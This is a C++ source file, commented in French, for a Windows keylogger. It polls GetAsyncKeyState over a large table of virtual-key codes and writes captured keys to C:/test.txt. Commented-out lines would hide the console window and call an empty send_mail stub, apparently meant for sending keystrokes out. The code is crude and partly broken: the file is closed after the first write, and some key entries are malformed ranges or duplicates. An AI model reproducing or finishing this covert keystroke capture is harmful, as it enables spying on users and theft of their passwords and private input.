// KeyLogger.cpp : définit le point d'entrée pour l'application console.
//

#include "stdafx.h"


int main()
{
	//ShowWindow(GetConsoleWindow(), 0);

	init_tab();

	std::ofstream output("C:/test.txt", std::ofstream::out); //ne créé par le fichier

	//time_begin = time(NULL);
	while (1) {
		for (const auto& kv : keys) {
			unsigned int x;
			std::stringstream ss;
			ss << std::hex << kv.first;
			ss >> x;

			if (GetAsyncKeyState(static_cast<int>(x))) {
				output << x;
				output.close();

				//send_mail();
			}
		}
	}

	return 0;
}

void init_tab() {
	keys["0x01"] = 1;
	keys["0x02"] = 1;
	keys["0x03"] = 1;
	keys["0x04"] = 1;
	keys["0x05"] = 1;
	keys["0x06"] = 1;
	keys["0x07"] = 1;
	keys["0x08"] = 1;
	keys["0x09"] = 1;
	keys["0x0A-0B"] = 1;
	keys["0x0C"] = 1;
	keys["0x0D"] = 1;
	keys["0x0E-0F"] = 1;
	keys["0x10"] = 1;
	keys["0x11"] = 1;
	keys["0x12"] = 1;
	keys["0x13"] = 1;
	keys["0x14"] = 1;
	keys["0x15"] = 1;
	keys["0x15"] = 1;
	keys["0x15"] = 1;
	keys["0x16"] = 1;
	keys["0x17"] = 1;
	keys["0x18"] = 1;
	keys["0x19"] = 1;
	keys["0x19"] = 1;
	keys["0x1A"] = 1;
	keys["0x1B"] = 1;
	keys["0x1C"] = 1;
	keys["0x1D"] = 1;
	keys["0x1E"] = 1;
	keys["0x1F"] = 1;
	keys["0x20"] = 1;
	keys["0x21"] = 1;
	keys["0x22"] = 1;
	keys["0x23"] = 1;
	keys["0x24"] = 1;
	keys["0x25"] = 1;
	keys["0x26"] = 1;
	keys["0x27"] = 1;
	keys["0x28"] = 1;
	keys["0x29"] = 1;
	keys["0x2A"] = 1;
	keys["0x2B"] = 1;
	keys["0x2C"] = 1;
	keys["0x2D"] = 1;
	keys["0x2E"] = 1;
	keys["0x2F"] = 1;
	keys["0x30"] = 1;
	keys["0x31"] = 1;
	keys["0x32"] = 1;
	keys["0x33"] = 1;
	keys["0x34"] = 1;
	keys["0x35"] = 1;
	keys["0x36"] = 1;
	keys["0x37"] = 1;
	keys["0x38"] = 1;
	keys["0x39"] = 1;
	keys["0x3A-40"] = 1;
	keys["0x41"] = 1;
	keys["0x42"] = 1;
	keys["0x43"] = 1;
	keys["0x44"] = 1;
	keys["0x45"] = 1;
	keys["0x46"] = 1;
	keys["0x47"] = 1;
	keys["0x48"] = 1;
	keys["0x49"] = 1;
	keys["0x4A"] = 1;
	keys["0x4B"] = 1;
	keys["0x4C"] = 1;
	keys["0x4D"] = 1;
	keys["0x4E"] = 1;
	keys["0x4F"] = 1;
	keys["0x50"] = 1;
	keys["0x51"] = 1;
	keys["0x52"] = 1;
	keys["0x53"] = 1;
	keys["0x54"] = 1;
	keys["0x55"] = 1;
	keys["0x56"] = 1;
	keys["0x57"] = 1;
	keys["0x58"] = 1;
	keys["0x59"] = 1;
	keys["0x5A"] = 1;
	keys["0x5B"] = 1;
	keys["0x5C"] = 1;
	keys["0x5D"] = 1;
	keys["0x5E"] = 1;
	keys["0x5F"] = 1;
	keys["0x60"] = 1;
	keys["0x61"] = 1;
	keys["0x62"] = 1;
	keys["0x63"] = 1;
	keys["0x64"] = 1;
	keys["0x65"] = 1;
	keys["0x66"] = 1;
	keys["0x67"] = 1;
	keys["0x68"] = 1;
	keys["0x69"] = 1;
	keys["0x6A"] = 1;
	keys["0x6B"] = 1;
	keys["0x6C"] = 1;
	keys["0x6D"] = 1;
	keys["0x6E"] = 1;
	keys["0x6F"] = 1;
	keys["0x70"] = 1;
	keys["0x71"] = 1;
	keys["0x72"] = 1;
	keys["0x73"] = 1;
	keys["0x74"] = 1;
	keys["0x75"] = 1;
	keys["0x76"] = 1;
	keys["0x77"] = 1;
	keys["0x78"] = 1;
	keys["0x79"] = 1;
	keys["0x7A"] = 1;
	keys["0x7B"] = 1;
	keys["0x7C"] = 1;
	keys["0x7D"] = 1;
	keys["0x7E"] = 1;
	keys["0x7F"] = 1;
	keys["0x80"] = 1;
	keys["0x81"] = 1;
	keys["0x82"] = 1;
	keys["0x83"] = 1;
	keys["0x84"] = 1;
	keys["0x85"] = 1;
	keys["0x86"] = 1;
	keys["0x87"] = 1;
	keys["0x88-8F"] = 1;
	keys["0x90"] = 1;
	keys["0x91"] = 1;
	keys["0x92-96"] = 1;
	keys["0x97-9F"] = 1;
	keys["0xA0"] = 1;
	keys["0xA1"] = 1;
	keys["0xA2"] = 1;
	keys["0xA3"] = 1;
	keys["0xA4"] = 1;
	keys["0xA5"] = 1;
	keys["0xA6"] = 1;
	keys["0xA7"] = 1;
	keys["0xA8"] = 1;
	keys["0xA9"] = 1;
	keys["0xAA"] = 1;
	keys["0xAB"] = 1;
	keys["0xAC"] = 1;
	keys["0xAD"] = 1;
	keys["0xAE"] = 1;
	keys["0xAF"] = 1;
	keys["0xB0"] = 1;
	keys["0xB1"] = 1;
	keys["0xB2"] = 1;
	keys["0xB3"] = 1;
	keys["0xB4"] = 1;
	keys["0xB5"] = 1;
	keys["0xB6"] = 1;
	keys["0xB7"] = 1;
	keys["0xB8-B9"] = 1;
	keys["0xBA"] = 1;
	keys["0xBB"] = 1;
	keys["0xBC"] = 1;
	keys["0xBD"] = 1;
	keys["0xBE"] = 1;
	keys["0xBF"] = 1;
	keys["0xC0"] = 1;
	keys["0xC1-D7"] = 1;
	keys["0xD8-DA"] = 1;
	keys["0xDB"] = 1;
	keys["0xDC"] = 1;
	keys["0xDD"] = 1;
	keys["0xDE"] = 1;
	keys["0xDF"] = 1;
	keys["0xE0"] = 1;
	keys["0xE1"] = 1;
	keys["0xE2"] = 1;
	keys["0xE3-E4"] = 1;
	keys["0xE5"] = 1;
	keys["0xE6"] = 1;
	keys["0xE7"] = 1;
	keys["0xE8"] = 1;
	keys["0xE9-F5"] = 1;
	keys["0xF6"] = 1;
	keys["0xF7"] = 1;
	keys["0xF8"] = 1;
	keys["0xF9"] = 1;
	keys["0xFA"] = 1;
	keys["0xFB"] = 1;
	keys["0xFC"] = 1;
	keys["0xFD"] = 1;
	keys["0xFE"] = 1;
}

void send_mail() {

}